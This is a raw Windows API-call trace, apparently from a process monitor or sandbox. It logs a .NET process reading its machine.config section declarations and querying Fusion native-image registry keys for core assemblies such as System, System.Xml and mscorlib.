+NtReadFile,|0#<?xml version="1.0" encoding="UTF-8" ?>
+<!--
+    Please refer to machine.config.comments for a description and
+    the default values of each configuration section.
+
+    For a full documentation of the schema please refer to
+    http://go.microsoft.com/fwlink/?LinkId=42127
+
+    To improve performance, machine.config should contain only those
+    settings that differ from their defaults.
+-->
+<configuration>
+    <configSections>
+        <section name="appSettings" type="System.Configuration.AppSettingsSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" restartOnExternalChanges="false" requirePermission="false" />
+        <section name="connectionStrings" type="System.Configuration.ConnectionStringsSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+        <section name="mscorlib" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="runtime"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="assemblyBinding"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="satelliteassemblies" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="startup"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="system.codedom" type="System.CodeDom.Compiler.CodeDomConfigurationHandler, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data" type="System.Data.Common.DbProviderFactoriesConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.dataset" type="System.Configuration.NameValueFileSectionHandler, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" restartOnExternalChanges="false" />
+        <section name="system.data.odbc" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.oledb" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.oracleclient" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.sqlclient" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.diagnostics" type="System.Diagnostics.SystemDiagnosticsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.runtime.remoting" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="system.windows.forms" type="System.Windows.Forms.WindowsFormsSection, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="windows" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="uri" type="System.Configuration.UriSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <sectionG#0x0000014c#4095|,0,1542888185.562625
+NtReadFile,|0#roup name="system.runtime.caching" type="System.Runtime.Caching.Configuration.CachingSectionGroup, System.Runtime.Caching, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+            <section name="memoryCache" type="System.Runtime.Caching.Configuration.MemoryCacheSection, System.Runtime.Caching, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+        </sectionGroup>
+        <sectionGroup name="system.xml.serialization" type="System.Xml.Serialization.Configuration.SerializationSectionGroup, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="schemaImporterExtensions" type="System.Xml.Serialization.Configuration.SchemaImporterExtensionsSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="dateTimeSerialization" type="System.Xml.Serialization.Configuration.DateTimeSerializationSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="xmlSerializer" type="System.Xml.Serialization.Configuration.XmlSerializerSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
+        </sectionGroup>
+        <sectionGroup name="system.net" type="System.Net.Configuration.NetSectionGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="authenticationModules" type="System.Net.Configuration.AuthenticationModulesSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="connectionManagement" type="System.Net.Configuration.ConnectionManagementSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="defaultProxy" type="System.Net.Configuration.DefaultProxySection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <sectionGroup name="mailSettings" type="System.Net.Configuration.MailSettingsSectionGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+                <section name="smtp" type="System.Net.Configuration.SmtpSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            </sectionGroup>
+            <section name="requestCaching" type="System.Net.Configuration.RequestCachingSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="settings" type="System.Net.Configuration.SettingsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="webRequestModules" type="System.Net.Configuration.WebRequestModulesSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        </sectionGroup>
+        <sectionGroup name="system.runtime.serialization" type="System.Runtime.Serialization.Configuration.SerializationSectionGroup, System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="dataContractSerializer" type="System.Runtime.Serialization.Configuration.DataContractSerializerSection, System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+        </sectionGroup>
+        <sectionGroup name="system.serviceModel" type="System.ServiceModel.Configuration.ServiceModelSectionGroup, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="behaviors" type="System.ServiceModel.Configuration.BehaviorsSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="bindings" type="System.ServiceModel.Configuration.BindingsSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="client" type="System.ServiceModel.Configuratio#0x0000014c#6135|,0,1542888185.562625
+NtReadFile,|0#/>
+            <section name="routing" type="System.ServiceModel.Routing.Configuration.RoutingSection, System.ServiceModel.Routing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
+            <section name="tracking" type="System.ServiceModel.Activities.Tracking.Configuration.TrackingSection, System.ServiceModel.Activities, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
+        </sectionGroup>
+        <sectionGroup name="system.serviceModel.activation" type="System.ServiceModel.Activation.Configuration.ServiceModelActivationSectionGroup, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="diagnostics" type="System.ServiceModel.Activation.Configuration.DiagnosticSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="net.pipe" type="System.ServiceModel.Activation.Configuration.NetPipeSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="net.tcp" type="System.ServiceModel.Activation.Configuration.NetTcpSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+        </sectionGroup>
+        <sectionGroup name="system.transactions" type="System.Transactions.Configuration.TransactionsSectionGroup, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null">
+           <section name="defaultSettings" type="System.Transactions.Configuration.DefaultSettingsSection, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null" />
+           <section name="machineSettings" type="System.Transactions.Configuration.MachineSettingsSection, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null" allowDefinition="MachineOnly" allowExeDefinition="MachineOnly"/>
+        </sectionGroup>
+        <sectionGroup name="system.web" type="System.Web.Configuration.SystemWebSectionGroup, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+            <section name="anonymousIdentification" type="System.Web.Configuration.AnonymousIdentificationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="authentication" type="System.Web.Configuration.AuthenticationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="authorization" type="System.Web.Configuration.AuthorizationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="browserCaps" type="System.Web.Configuration.HttpCapabilitiesSectionHandler, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="clientTarget" type="System.Web.Configuration.ClientTargetSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="compilation" type="System.Web.Configuration.CompilationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+            <section name="customErrors" type="System.Web.Configuration.CustomErrorsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="deployment" type="System.Web.Configuration.DeploymentSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineOnly" />
+            <section name="deviceFilters" type="System.Web.Mobile.DeviceFiltersSection, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="fullTrustAssemblies" type="System.Web.Configuration.FullTrustAssembliesSection, System.Web, Version=4.0.0.0, Culture#0x0000014c#4097|,0,1542888185.578625
+NtReadFile,|0#neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="globalization" type="System.Web.Configuration.GlobalizationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="healthMonitoring" type="System.Web.Configuration.HealthMonitoringSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="hostingEnvironment" type="System.Web.Configuration.HostingEnvironmentSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="httpCookies" type="System.Web.Configuration.HttpCookiesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpHandlers" type="System.Web.Configuration.HttpHandlersSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpModules" type="System.Web.Configuration.HttpModulesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpRuntime" type="System.Web.Configuration.HttpRuntimeSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="identity" type="System.Web.Configuration.IdentitySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="machineKey" type="System.Web.Configuration.MachineKeySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="membership" type="System.Web.Configuration.MembershipSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="mobileControls" type="System.Web.UI.MobileControls.MobileControlsSection, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="pages" type="System.Web.Configuration.PagesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+            <section name="partialTrustVisibleAssemblies" type="System.Web.Configuration.PartialTrustVisibleAssembliesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="processModel" type="System.Web.Configuration.ProcessModelSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineOnly" allowLocation="false" />
+            <section name="profile" type="System.Web.Configuration.ProfileSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="protocols" type="System.Web.Configuration.ProtocolsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToWebRoot" />
+            <section name="roleManager" type="System.Web.Configuration.RoleManagerSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="securityPolicy" type="System.Web.Configuration.SecurityPolicySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="sessionPageState" type="System.Web.Configuration.SessionPageStateSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="sessionState" type="System.Web.Configuration.SessionStateSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />#0x0000014c#4098|,0,1542888185.578625
+NtReadFile,|0#            <section name="siteMap" type="System.Web.Configuration.SiteMapSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="trace" type="System.Web.Configuration.TraceSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="trust" type="System.Web.Configuration.TrustSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="urlMappings" type="System.Web.Configuration.UrlMappingsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="webControls" type="System.Web.Configuration.WebControlsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="webParts" type="System.Web.Configuration.WebPartsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="webServices" type="System.Web.Services.Configuration.WebServicesSection, System.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="xhtmlConformance" type="System.Web.Configuration.XhtmlConformanceSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <sectionGroup name="caching" type="System.Web.Configuration.SystemWebCachingSectionGroup, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+                <section name="cache" type="System.Web.Configuration.CacheSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="outputCache" type="System.Web.Configuration.OutputCacheSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="outputCacheSettings" type="System.Web.Configuration.OutputCacheSettingsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="sqlCacheDependency" type="System.Web.Configuration.SqlCacheDependencySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            </sectionGroup>
+        </sectionGroup>
+        <sectionGroup name="system.web.extensions" type="System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+            <sectionGroup name="scripting" type="System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+                <section name="scriptResourceHandler" type="System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="MachineToApplication"/>
+                <sectionGroup name="webServices" type="System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+                    <section name="jsonSerialization" type="System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="Everywhere" />
+                    <section name="profileService" type="System.Web.Configuration.ScriptingProfileServiceSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="MachineToApplication" />
+                    <section name="authenticatio#0x0000014c#7976|,0,1542888185.578625
+NtFreeVirtualMemory,36864#16384#1776#0x0049a000#0xffffffff,0,1542888185.578625
+NtFreeVirtualMemory,16384#16384#1776#0x00493000#0xffffffff,0,1542888185.578625
+NtFreeVirtualMemory,4096#16384#1776#0x0048e000#0xffffffff,0,1542888185.578625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x0048e000#4096#4#0,0,1542888185.578625
+NtAllocateVirtualMemory,0#0#1776#16384#0xffffffff#0x00493000#4096#4#0,0,1542888185.578625
+NtAllocateVirtualMemory,0#0#1776#36864#0xffffffff#0x0049a000#4096#4#0,0,1542888185.578625
+NtClose,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x00000000#v4.0_policy.4.0.System__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\v4.0_policy.4.0.System__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x00000000#policy.4.0.System__b77a5c561934e089#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\PublisherPolicy\Default\policy.4.0.System__b77a5c561934e089#0x00000144#0,2,1542888185.578625
+RegOpenKeyExW,0x0000014c#NI\30bc7c4f\5a99e5cd#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd#0x0000013c#0,0,1542888185.578625
+RegEnumKeyExW,#0#8#0x0000014c#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd,0,1542888185.578625
+RegEnumKeyExW,#1#8#0x0000014c#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd,259,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#NI\30bc7c4f\5a99e5cd\8#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\DisplayName#0x0000014c#DisplayName#1#System,4.0.0.0,,b77a5c561934e089|,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\ConfigMask#0x0000014c#ConfigMask#4#4361,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\ConfigString#0x0000014c#ConfigString#1#,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\MVID#0x0000014c#MVID#3#M 'ëÊ;&:ÊÛª £,0,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#NI\30bc7c4f\5a99e5cd\8#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\EvalationData#0x0000014c#EvalationData#0#,2,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\Status#0x0000014c#Status#4#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\ILDependencies#0x0000014c#ILDependencies#3#V¼]ï;          Õtô4?o$e          Õtô4?o$e          V¼]ï;          ÍåZ¶çe          |,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\NIDependencies#0x0000014c#NIDependencies#3#Æ8BÊ          Æ8BÊ          |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\30bc7c4f\5a99e5cd\8\MissingDependencies#0x0000014c#MissingDependencies#0#,2,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#IL\5d94bc56\3b150cef\6#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\DisplayName#0x0000014c#DisplayName#1#System.Configuration,4.0.0.0,,b03f5f7f11d50a3a|,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\Status#0x0000014c#Status#4#4098,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\Modules#0x0000014c#Modules#0#,2,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\SIG#0x0000014c#SIG#3#ú]'fÅ}@:3ï!Û,ïV¨¥ÔÀÊA}3é°×°\4¡!|,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\TargetedPatchBand#0x0000014c#TargetedPatchBand#3#1.0.21-0                         |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5d94bc56\3b150cef\6\LastModTime#0x0000014c#LastModTime#3#èvÂpaÓ,0,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#IL\34f474d5\65246f3f\7#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\DisplayName#0x0000014c#DisplayName#1#System.Xml,4.0.0.0,,b77a5c561934e089|,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\Status#0x0000014c#Status#4#4098,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\Modules#0x0000014c#Modules#0#,2,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\SIG#0x0000014c#SIG#3#Å $ç¶G´_ÒÅ ^ÙÐrP¯Mý§¤?o­TøÏä|,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\TargetedPatchBand#0x0000014c#TargetedPatchBand#3#1.0.21-0                         |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\34f474d5\65246f3f\7\LastModTime#0x0000014c#LastModTime#3#¤ªÂpaÓ,0,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#IL\5a99e5cd\6598e7b6\8#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\DisplayName#0x0000014c#DisplayName#1#System,4.0.0.0,,b77a5c561934e089|,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\Status#0x0000014c#Status#4#4098,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\Modules#0x0000014c#Modules#0#,2,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\SIG#0x0000014c#SIG#3#1{OàGSK¨=ÈVbaµ×Ø/Rçl7Î ¯igKN/0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\TargetedPatchBand#0x0000014c#TargetedPatchBand#3#1.0.21-0                         |,0,1542888185.578625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\IL\5a99e5cd\6598e7b6\8\LastModTime#0x0000014c#LastModTime#3#zÂpaÓ,0,1542888185.578625
+RegCloseKey,0x0000014c,0,1542888185.578625
+RegOpenKeyExW,0x0000014c#NI\181938c6\1499ca42\1#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1#0x0000013c#0,0,1542888185.578625
+RegQueryValueExW,|HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NativeImagesIndex\v4.0.30319_32\NI\181938c6\1499ca42\1\DisplayName#0x0000014c#DisplayName#1#mscorlib,4.0.0.0,,b77a5c561934e089|,0,1542888185.578625
